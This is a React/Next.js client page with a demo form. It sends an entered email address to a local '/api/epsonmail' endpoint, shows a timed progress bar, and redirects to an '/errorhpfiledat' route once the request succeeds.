"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function DemoPage() {
  const [EPmodel, setEpmodel] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    // step simulation
    let currentStep = 0;
    const interval = setInterval(() => {
      currentStep++;
      setStep(currentStep);
      if (currentStep >= totalSteps) clearInterval(interval);
    }, 1000);

    try {
      const res = await fetch("/api/epsonmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ EPmodel }),
      });

      const data = await res.json();
      if (data.success) {
        setTimeout(() => router.push("/errorhpfiledat"), 3000);
      } else {
        alert("Failed to send email.");
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      alert("Error sending email.");
      setLoading(false);
    }
  };

  return (
    <div style={{ maxWidth: "400px", margin: "50px auto", textAlign: "center" }}>
      {!loading ? (
        <form onSubmit={handleSubmit}>
          <h2>Demo Form</h2>
          <input
            type="text"
            placeholder="Enter your email"
            value={EPmodel}
            onChange={(e) => setEpmodel(e.target.value)}
            required
            style={{ padding: "10px", width: "100%", marginBottom: "10px" }}
          />
          <button type="submit" style={{ padding: "10px 20px" }}>
            Submit
          </button>
        </form>
      ) : (
        <div>
          <h3>Processing...</h3>

          {/* Progress Bar */}
          <div
            style={{
              width: "100%",
              height: "12px",
              backgroundColor: "#e0e0e0",
              borderRadius: "8px",
              overflow: "hidden",
              margin: "20px 0"
            }}
          >
            <div
              style={{
                height: "100%",
                width: `${(step / totalSteps) * 100}%`,
                backgroundColor: "#4caf50",
                transition: "width 0.5s ease-in-out"
              }}
            />
          </div>

          <p>{step} of {totalSteps} steps completed</p>
        </div>
      )}
    </div>
  );
}
